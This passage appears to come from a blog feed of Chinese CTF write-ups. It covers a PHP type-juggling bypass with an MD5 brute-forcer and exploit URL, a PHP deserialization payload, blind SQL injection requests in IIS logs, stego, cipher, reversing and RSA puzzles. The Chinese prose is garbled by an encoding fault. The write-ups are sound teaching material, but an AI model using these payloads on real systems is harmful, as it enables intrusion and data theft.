class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$a=<span class="number">0</span>; </span><br><span class="line">$b=<span class="number">0</span>; </span><br><span class="line">$c=<span class="number">0</span>; </span><br><span class="line">$d=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) <span class="comment">//$x1=0;=&gt;$a=1;</span></span><br><span class="line">&#123; </span><br><span class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </span><br><span class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> ($x1) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                $a=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </span><br><span class="line"><span class="comment">//$x2=json_encode(['x21'=&gt;'2018hello','x22'=&gt;[[],0]]) ;</span></span><br><span class="line"><span class="comment">//string(32) "&#123;"x21":"2018hello","x22":[[],0]&#125;"</span></span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123; </span><br><span class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </span><br><span class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </span><br><span class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </span><br><span class="line">        <span class="comment">//array_search ‚Äî Âú®Êï∞ÁªÑ‰∏≠ÊêúÁ¥¢ÁªôÂÆöÁöÑÂÄºÔºåÂ¶ÇÊûúÊàêÂäüÂàôËøîÂõûÁõ∏Â∫îÁöÑÈîÆÂêç </span></span><br><span class="line">        <span class="comment">//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</span></span><br><span class="line">        <span class="comment">//Á¨¨‰∏â‰∏™ÂèÇÊï∞ÂÜ≥ÂÆöÂú®ÊêúÁ¥¢Êó∂ÊòØÂê¶ÊØîËæÉÁ±ªÂûãÔºåÈªòËÆ§‰∏çÊØîËæÉÔºå‰πüÊòØËøôÈáåËÉΩÂ§üÁªïËøáÁöÑÂéüÂõ†„ÄÇ</span></span><br><span class="line">        <span class="comment">//var_dump(array_search('XIPU', array("0","1",0)));//int(2)</span></span><br><span class="line">        <span class="comment">//0==‚ÄòXIPU‚Äô‰∏∫ÁúüÔºåÊêúÁ¥¢Âà∞0ÂÄºÁöÑ‰∏ãÊ†á‰∏∫2</span></span><br><span class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </span><br><span class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $c=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </span><br><span class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </span><br><span class="line">            <span class="comment">//‰∏§‰∏™Á¨¶ÂêàÊ≠£Âàô  /0e\d+/  ÁöÑÂ≠óÁ¨¶‰∏≤Âº±Áõ∏Á≠â„ÄÇ</span></span><br><span class="line">            <span class="comment">// ÁàÜÁ†¥ËßÅ‰∏ãÊñπpython‰ª£Á†Å</span></span><br><span class="line">            $d=<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">                    x = chr(a) + chr(b) + chr(c)+s</span><br><span class="line">                    mm=md5(x.encode(<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> mm[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">                        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                            flag=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">and</span> mm[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</span><br><span class="line">                        print(x)</span><br><span class="line"></span><br><span class="line">brute()</span><br><span class="line"><span class="comment"># kN[XIPU</span></span><br><span class="line"><span class="comment"># v=|XIPU</span></span><br><span class="line"><span class="comment"># y'wXIPU</span></span><br><span class="line"><span class="comment"># &#125;MOXIPU</span></span><br><span class="line"><span class="comment"># ~VhXIPU</span></span><br><span class="line"><span class="comment">## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2=&#123;%22x21%22:%222018hello%22,%22x22%22:[[],0]&#125;&amp;x3=~VhXIPU</span></span><br><span class="line"><span class="comment">## flag&#123;510ea2879fa29d0d618b1f55350965c3&#125;</span></span><br></pre></td></tr></table></figure><h1 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h1><p>Âíå bugku Âπ≥Âè∞Êüê‰∏™È¢òÁõÆÂéüÁêÜÁõ∏‰ººÔºåÂõ†Ê≠§Ê≤°Êúâ‰øùÁïôÊ∫êÁ†Å„ÄÇÂèØ‰ª•ÂèÇËÄÉ <a href="https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf">ËØ•È¢ò</a> Ôºå‰∏çËµòËø∞„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/web/theuserisadmin/?file=class.php&amp;user=php://input&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span><br><span class="line"></span><br><span class="line">post:the user is admin</span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;078d8dd8023d5716a11780adf344dfd2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ccgs"><a href="#ccgs" class="headerlink" title="ccgs"></a>ccgs</h1><p><img src="1537109403700.png" alt="1537109403700"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e sgcc.png</span><br><span class="line">cat secret.txt | base64 -d | base64 -d &gt; final.png</span><br></pre></td></tr></table></figure><p><img src="1537070199581.png" alt="1537070199581"></p><h1 id="Ê≥®ÂÖ•Êó•ÂøóÂàÜÊûê"><a href="#Ê≥®ÂÖ•Êó•ÂøóÂàÜÊûê" class="headerlink" title="Ê≥®ÂÖ•Êó•ÂøóÂàÜÊûê"></a>Ê≥®ÂÖ•Êó•ÂøóÂàÜÊûê</h1><p>Áªô‰∫Ü‰∏Ä‰∏™Êó•ÂøóÊñá‰ª∂Ôºå<code>file data.log</code>ÂæóÂà∞ÊòØ‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ÔºåÁõ¥Êé•ÊâìÂºÄÔºåÂâçÂá†Ë°åÊòØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 6.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2015-10-21 09:16:34</span><br></pre></td></tr></table></figure><p>ÁåúÊµãÊòØIISÊúçÂä°Âô®ËÆ∞ÂΩïÁöÑÊµÅÈáèÊó•ÂøóÔºå ÂàÜÊûêÂâçÂá†Ë°å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2</span><br><span class="line">2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|Â≠óÁ¨¶‰∏≤_&apos;&apos;_‰πãÂâçÊúâÊú™Èó≠ÂêàÁöÑÂºïÂè∑„ÄÇ 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞Â∞±ÊòØ‰∏ÄÊù°Êù°ÁöÑHTTPËØ∑Ê±ÇÔºåÂπ∂‰∏îÂêéÈù¢Ë∑üÁùÄÁä∂ÊÄÅÁ†Å„ÄÇÁªßÁª≠ÊµèËßàÔºåÁúãÂà∞<code>id</code>Â≠óÊÆµÂá∫Áé∞‰∏Ä‰∫õ<code>SQL</code>ÁöÑÂÖ≥ÈîÆÂ≠óÔºåÈÇ£‰πàÂèØ‰ª•ÊÉ≥Âà∞ËøôËÆ∞ÂΩïÁöÑÂ∞±ÊòØ<code>sqlmap</code>(ÊàñËÆ∏)ÁöÑÊ≥®ÂÖ•ÊµÅÈáèÂàÜÊûê„ÄÇÊÄùË∑ØÂ∞±ÊòØÊâæÂà∞ÂÖ≥ÈîÆÁöÑÊ≥®ÂÖ•ËØ∑Ê±ÇÔºåÊñá‰ª∂ÂæàÂ§ßÔºåÊàë‰ª¨ÂèØ‰ª•ÊêúÁ¥¢<code>flag</code>ËØïËØïÔºåÊâæÂà∞ÂÖ≥ÈîÆÁöÑËØ∑Ê±ÇÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_Êàñ_EOF_‰∏≠Êúâ‰∏Ä‰∏™ÊòØ‚ÄúÁúü‚ÄùÔºåÊàñËÄÖÂΩìÂâçÁöÑËÆ∞ÂΩïÂ∑≤Ë¢´Âà†Èô§ÔºåÊâÄÈúÄÁöÑÊìç‰ΩúË¶ÅÊ±Ç‰∏Ä‰∏™ÂΩìÂâçÁöÑËÆ∞ÂΩï„ÄÇ 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•Âà©Áî®ÊñáÊú¨ÁºñËæëÂô®Â¶Ç<code>sublime text 3</code>ÁöÑ<code>ctrl+H</code>ÁöÑÊõøÊç¢ÂäüËÉΩÔºå Â∞ÜÂÖ≥ÈîÆÊµÅÈáèËøõË°åÁ≤æÁÆÄÂπ∂<code>urldecode</code>Âà©‰∫éÂàÜÊûê(Êà™Âèñ‰∏§‰∏™‰ª£Ë°®ÊÄßËØ∑Ê±Ç)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_Êàñ_EOF_‰∏≠Êúâ‰∏Ä‰∏™ÊòØ‚ÄúÁúü‚ÄùÔºåÊàñËÄÖÂΩìÂâçÁöÑËÆ∞ÂΩïÂ∑≤Ë¢´Âà†Èô§ÔºåÊâÄÈúÄÁöÑÊìç‰ΩúË¶ÅÊ±Ç‰∏Ä‰∏™ÂΩìÂâçÁöÑËÆ∞ÂΩï„ÄÇ 500 0 0</span><br><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊòØ‰∫åÂàÜÊ≥ïÁõ≤Ê≥®ÁöÑHTTPËØ∑Ê±ÇÔºåÁé∞Âú®ÊÄùË∑ØÂæàÊòéÁ°Æ‰∫ÜÔºå ‰ªé<code>SUBSTRING(.*, 1, 1)</code>ÂºÄÂßãÊâæÔºåÂπ∂‰∏îÂè™Ë¶ÅÁúãÊúÄÂêéÂá†Êù°ÁöÑÊ≥®ÂÖ•ËØ∑Ê±ÇÂ∞±ÂèØ‰ª•Âà§Êñ≠Âá∫Â≠óÁ¨¶ÊòØÂ§öÂ∞ë„ÄÇ ÊØîÂ¶Ç<code>SUBSTRING(.*, 1, 1) &gt; 48</code>ÁöÑÁä∂ÊÄÅÁ†ÅÊòØ<code>200</code>Ôºå<code>SUBSTRING(.*, 1, 1) &gt; 49</code>ÁöÑÁä∂ÊÄÅÁ†ÅÊòØ<code>500</code>ÔºåÈÇ£ÂÖ∂ÂÆûÂ∞±ÂèØ‰ª•Á°ÆÂÆöÂ≠óÁ¨¶ÁöÑasciiÁ†ÅÊòØ49„ÄÇÂ∞±ËøôÊ†∑Â∞±ËÉΩÂæóÂà∞<code>theflag</code>ÁöÑÂÄº„ÄÇ</p><h1 id="brightstar"><a href="#brightstar" class="headerlink" title="brightstar"></a>brightstar</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9" target="_blank" rel="noopener">ÂàóÁßª‰ΩçÂØÜÁ†Å</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees</span><br><span class="line">keyÔºö howarey</span><br><span class="line">Columnar Transposition Cipher</span><br></pre></td></tr></table></figure><table><thead><tr><th>h</th><th>o</th><th>w</th><th>a</th><th>r</th><th>e</th><th>y</th></tr></thead><tbody><tr><td>3</td><td>4</td><td>6</td><td>1</td><td>5</td><td>2</td><td>7</td></tr><tr><td>I</td><td>t</td><td>i</td><td>s</td><td>o</td><td>f</td><td>t</td></tr><tr><td>e</td><td>n</td><td>i</td><td>n</td><td>t</td><td>h</td><td>e</td></tr><tr><td>d</td><td>a</td><td>r</td><td>k</td><td>e</td><td>s</td><td>t</td></tr><tr><td>s</td><td>k</td><td>i</td><td>e</td><td>s</td><td>t</td><td>h</td></tr><tr><td>a</td><td>t</td><td>w</td><td>e</td><td>s</td><td>e</td><td>e</td></tr><tr><td>b</td><td>r</td><td>i</td><td>g</td><td>h</td><td>t</td><td>e</td></tr><tr><td>s</td><td>t</td><td>s</td><td>t</td><td>a</td><td>r</td><td>s</td></tr></tbody></table><p>ÊàñËÄÖ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">'snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees'</span>.split(<span class="string">' '</span>)</span><br><span class="line">k=<span class="string">'howarey'</span></span><br><span class="line">kk=sorted(k)</span><br><span class="line">print(<span class="string">''</span>.join(c[kk.index(j)][i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)) <span class="keyword">for</span> j <span class="keyword">in</span> k))</span><br><span class="line"><span class="comment"># Itisofteninthedarkestskiesthatweseebrighteststars</span></span><br></pre></td></tr></table></figure><h1 id="ËøôÊòØÂï•ÂëÄ"><a href="#ËøôÊòØÂï•ÂëÄ" class="headerlink" title="ËøôÊòØÂï•ÂëÄ"></a>ËøôÊòØÂï•ÂëÄ</h1><p>base32ÁºñÁ†Å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d</span><br><span class="line"><span class="meta">#</span><span class="bash">flag&#123;c8b558b954019856f0b02345dc39558c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WindowsÈÄÜÂêë"><a href="#WindowsÈÄÜÂêë" class="headerlink" title="WindowsÈÄÜÂêë"></a>WindowsÈÄÜÂêë</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&apos;</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</span><br><span class="line">for i in idx:</span><br><span class="line">     flag+=s[i]</span><br><span class="line">print(flag)</span><br><span class="line"># KEY&#123;e2s6ry3r5s8f6</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞ÈÉ®ÂàÜflagÔºåÂä†‰∏ä1024}ÂæóÂà∞ÂÆåÊï¥flagÔºöKEY{e2s6ry3r5s8f61024}</p><h1 id="reverseme"><a href="#reverseme" class="headerlink" title="reverseme"></a>reverseme</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"open('file.png','wb').write(open('reverseme','rb').read()[::-1])"</span></span><br><span class="line">Êàñ</span><br><span class="line">&lt;reverseme xxd -p -c1 | tac | xxd -p -r &gt;file.png</span><br></pre></td></tr></table></figure><p><img src="1537420090085.png" alt="1537420090085"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -flop file.png mirror_file.png</span><br></pre></td></tr></table></figure><p><img src="1537420103233.png" alt="1537420103233"></p><h1 id="‰∏ãÂçà"><a href="#‰∏ãÂçà" class="headerlink" title="‰∏ãÂçà"></a>‰∏ãÂçà</h1><p><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">CMSeeK</a> Êâ´Âá∫ÈÖçÁΩÆÊñá‰ª∂ <a href="http://192.168.200.202//configuration.php.txt" target="_blank" rel="noopener">http://192.168.200.202//configuration.php.txt</a> </p><p>Â∫ïÈÉ®Êúâflag: <code>flag{0b58f603ff55c0c190502b44b4ffbf2c}</code>  </p><p>Ê≠§Â§ñ‰∏Ä‰∫õÊ≤°Ëøõ‰∏ÄÊ≠•Âà©Áî®‰∏äÁöÑ‰ø°ÊÅØÂíåÈÉ®ÂàÜÈ¢òÁõÆÁöÑÈôÑ‰ª∂ÊîæÂú®<a href="https://github.com/findneo/ctfgodown/blob/master/20180916heidun/" target="_blank" rel="noopener">GiIthub</a> ÔºåÊúâÂÖ¥Ë∂£ÂèØÁßªÊ≠•Êü•Áúã„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018/9/16  Á¶èÂ∏àÂ§ßÈªëÁõæÊùØ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;1541605429359.png&quot; alt=&quot;1541605429359&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;‰ø°ÊÅØÊ≥ÑÈú≤-‰ª£Á†ÅÂÆ°ËÆ°&quot;&gt;&lt;a href=&quot;#‰ø°ÊÅØÊ≥ÑÈú≤-‰ª£Á†ÅÂÆ°ËÆ°&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ËÉñÂìàÂãÉ‰πã LHY</title>
    <link href="https://findneo.github.io/180903-pwnhub-lhy/"/>
    <id>https://findneo.github.io/180903-pwnhub-lhy/</id>
    <published>2018-09-02T18:29:11.000Z</published>
    <updated>2019-01-25T23:21:37.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> x, y, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gmpy.is_prime(y) ** <span class="number">2016</span> + gmpy.is_prime(x+<span class="number">1</span>) ** <span class="number">2017</span> + ((x**<span class="number">2</span> - <span class="number">1</span>)**<span class="number">2</span> % (<span class="number">2</span>*x*y - <span class="number">1</span>) + <span class="number">2</span>) ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br><span class="line"></span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>) <span class="comment">#(x+y)**3-3xy(x+y)</span></span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x) <span class="comment">#xy(x+y)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">enc = pow(bytes_to_long(flag), <span class="number">0x10001</span>, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n ='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'enc ='</span>, enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line"><span class="comment"># enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br></pre></td></tr></table></figure><h1 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h1><p>Áî±‰∫é</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>**<span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª• <code>x+1</code>Âíå <code>y</code> ÈÉΩÊòØË¥®Êï∞Ôºå<code>(x**2 - 1)**2 % (2*x*y - 1)==0</code> 